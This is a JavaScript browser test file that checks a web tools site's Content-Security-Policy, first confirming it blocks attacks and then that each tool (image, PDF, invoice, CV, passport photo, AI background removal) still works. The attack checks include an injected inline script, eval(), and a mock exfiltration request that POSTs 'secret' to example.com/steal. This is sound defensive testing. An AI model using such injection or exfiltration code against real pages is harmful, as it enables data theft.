// Runs the real tools while the production security headers (public/_headers) are enforced,
// to prove the Content-Security-Policy blocks bad things without breaking good things.
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { PDFDocument } from 'pdf-lib';
import { BASE, makeImage, status } from './lib.mjs';

// Read public/_headers into [{ pattern, headers }]
function parseHeaders() {
	const rules = [];
	for (const line of fs.readFileSync('public/_headers', 'utf8').split('\n')) {
		if (!line.trim() || line.trim().startsWith('#')) continue;
		if (!/^\s/.test(line)) rules.push({ pattern: line.trim(), headers: {} });
		else {
			const i = line.indexOf(':');
			rules.at(-1).headers[line.slice(0, i).trim().toLowerCase()] = line.slice(i + 1).trim();
		}
	}
	return rules;
}
const matches = (pattern, p) => (pattern.endsWith('/*') ? p.startsWith(pattern.slice(0, -1)) : pattern === p);

// A page whose server answers with the production headers, and which records CSP violations.
async function strictPage(t, route, width = 375) {
	const rules = parseHeaders();
	const context = await t.browser.newContext({ viewport: { width, height: 800 }, acceptDownloads: true });
	await context.route('**/*', async (r) => {
		try {
		const url = new URL(r.request().url());
		if (url.origin !== BASE) return r.continue();
		if (url.pathname === '/_astro/__evaltest.js') {
			// a script that lives on our own site (so it is allowed to run) and tries eval()
			const csp = rules.find((x) => x.pattern === '/*').headers;
			return r.fulfill({ status: 200, contentType: 'text/javascript', headers: csp, body: 'try { eval("window.__ev = 1"); } catch (e) { window.__evblocked = 1; }' });
		}
		const res = await r.fetch();
		const extra = {};
		for (const rule of rules) if (matches(rule.pattern, url.pathname)) Object.assign(extra, rule.headers);
		await r.fulfill({ response: res, headers: { ...res.headers(), ...extra } });
		} catch {
			// the test finished and closed the window while this request was still in flight: nothing to do
		}
	});
	const page = await context.newPage();
	page.violations = [];
	page.errors = [];
	page.on('pageerror', (e) => page.errors.push(e.message));
	page.on('console', (m) => {
		if (m.type() === 'error') page.errors.push(m.text());
	});
	await page.addInitScript(() => {
		window.__csp = [];
		document.addEventListener('securitypolicyviolation', (e) => window.__csp.push(`${e.violatedDirective} ${e.blockedURI}`));
	});
	await page.goto(BASE + route);
	return page;
}

const violations = async (page) => [...(await page.evaluate(() => window.__csp).catch(() => [])), ...page.errors.filter((e) => /Content Security Policy/i.test(e))];
const pdf = (name, buffer) => ({ name, mimeType: 'application/pdf', buffer });

export default async function (t) {
	// 1) The policy really blocks attacks
	{
		const page = await strictPage(t, '/');
		const result = await page.evaluate(async () => {
			const out = {};
			const s = document.createElement('script');
			s.textContent = 'window.__pwn = 1';
			document.body.append(s);
			out.inlineScript = window.__pwn === 1 ? 'RAN' : 'blocked';
			await new Promise((res) => {
				const e = document.createElement('script');
				e.src = '/_astro/__evaltest.js';
				e.onload = e.onerror = () => res();
				document.body.append(e);
			});
			out.eval = window.__ev === 1 ? 'RAN' : window.__evblocked === 1 ? 'blocked' : 'not tested';
			const el = document.createElement('div');
			el.setAttribute('style', 'color: red');
			out.styleAttr = 'set (CSS from attributes is blocked by the browser)';
			try {
				await fetch('https://example.com/steal', { method: 'POST', body: 'secret', mode: 'no-cors' });
				out.upload = 'SENT';
			} catch {
				out.upload = 'blocked';
			}
			const img = new Image();
			out.thirdPartyImage = await new Promise((res) => {
				img.onload = () => res('LOADED');
				img.onerror = () => res('blocked');
				img.src = 'https://example.com/pixel.png';
			});
			return out;
		});
		t.check('CSP blocks an injected inline script', result.inlineScript === 'blocked', result.inlineScript);
		t.check('CSP blocks eval()', result.eval === 'blocked', result.eval);
		t.check('CSP blocks sending data to another website', result.upload === 'blocked', result.upload);
		t.check('CSP blocks images from other websites', result.thirdPartyImage === 'blocked', result.thirdPartyImage);
		t.check('CSP violations were reported for those attempts', (await violations(page)).length >= 3);
		await page.context().close();
	}

	// 2) Every tool still works under the policy
	const flows = [
		['/', async (page) => {
			await page.click('#menu-button');
			t.check('menu works under CSP', await page.locator('#site-nav').isVisible());
		}],
		['/compress-image', async (page) => {
			const img = await makeImage(page, { w: 2000, h: 1500, quality: 0.95 });
			await page.setInputFiles('#file-input', { name: 'a.jpg', mimeType: 'image/jpeg', buffer: img });
			await page.waitForSelector('#results a');
			t.check('compress-image works under CSP', true);
		}],
		['/resize-image', async (page) => {
			const img = await makeImage(page, { w: 1000, h: 800, type: 'image/png' });
			await page.setInputFiles('#file-input', { name: 'a.png', mimeType: 'image/png', buffer: img });
			await page.waitForSelector('#editor:not(.hidden)');
			await page.click('#resize-btn');
			await page.waitForSelector('#results img.preview');
			t.check('resize-image works under CSP (including the blob preview image)', true);
		}],
		['/merge-pdf', async (page) => {
			const mk = async (n) => { const d = await PDFDocument.create(); for (let i = 0; i < n; i++) d.addPage([200, 200]); return Buffer.from(await d.save()); };
			await page.setInputFiles('#file-input', [pdf('a.pdf', await mk(2)), pdf('b.pdf', await mk(3))]);
			await page.click('#merge-btn');
			await page.waitForSelector('#results a', { timeout: 30000 });
			t.check('merge-pdf works under CSP (lazy-loaded library)', true);
		}],
		['/split-pdf', async (page) => {
			const d = await PDFDocument.create();
			for (let i = 0; i < 4; i++) d.addPage([200, 200]);
			await page.setInputFiles('#file-input', pdf('x.pdf', Buffer.from(await d.save())));
			await page.waitForSelector('#editor:not(.hidden)');
			await page.check('#mode-all');
			await page.click('#split-btn');
			await page.waitForSelector('#results a', { timeout: 30000 });
			t.check('split-pdf works under CSP (ZIP creation)', true);
		}],
		['/invoice-generator', async (page) => {
			const logo = await makeImage(page, { w: 400, h: 150, type: 'image/png' });
			await page.setInputFiles('#logo', { name: 'l.png', mimeType: 'image/png', buffer: logo });
			await page.waitForSelector('#doc img.doc-logo');
			await page.evaluate(() => new Promise((r) => { window.print = () => r(); document.getElementById('print-btn').click(); }));
			t.check('invoice-generator works under CSP (logo, print)', true);
		}],
		['/cv-builder', async (page) => {
			await page.fill('#name', 'Test Person');
			await page.selectOption('#accent', 'navy');
			t.check('cv-builder works under CSP (dynamic colour)', (await page.textContent('#doc')).includes('Test Person'));
		}],
		['/passport-photo-maker', async (page) => {
			const img = await makeImage(page, { w: 1500, h: 2000, quality: 0.9 });
			await page.setInputFiles('#file-input', { name: 'p.jpg', mimeType: 'image/jpeg', buffer: img });
			await page.waitForSelector('#editor:not(.hidden)');
			await page.click('#sheet-btn');
			await page.waitForSelector('#results img.preview');
			t.check('passport-photo-maker works under CSP (crop, sheet)', true);
		}],
	];
	for (const [route, run] of flows) {
		const page = await strictPage(t, route);
		await run(page);
		const v = await violations(page);
		t.check(`${route}: zero CSP violations`, v.length === 0, v.join(' | '));
		t.check(`${route}: no JavaScript errors`, page.errors.length === 0, page.errors.join(' | '));
		await page.context().close();
	}

	// 3) The AI engine (WebAssembly in a worker) under the policy
	const portrait = path.join(os.tmpdir(), 'gbam-test-portrait.jpg');
	if (fs.existsSync(portrait)) {
		const page = await strictPage(t, '/passport-photo-maker');
		await page.setInputFiles('#file-input', portrait);
		await page.waitForSelector('#editor:not(.hidden)');
		await page.click('#ai-btn');
		await page.waitForFunction(() => /^Done|could not|cannot|stopped/i.test(document.getElementById('ai-status').textContent), null, { timeout: 180000 });
		t.check('AI background removal works under CSP', /^Done/.test(await page.textContent('#ai-status')), await page.textContent('#ai-status'));
		const v = await violations(page);
		t.check('AI background removal: zero CSP violations', v.length === 0, v.join(' | '));
		await page.context().close();
	} else {
		t.info('AI-under-CSP test skipped: run the passport suite once first so the test portrait is downloaded');
	}
	void status;
}
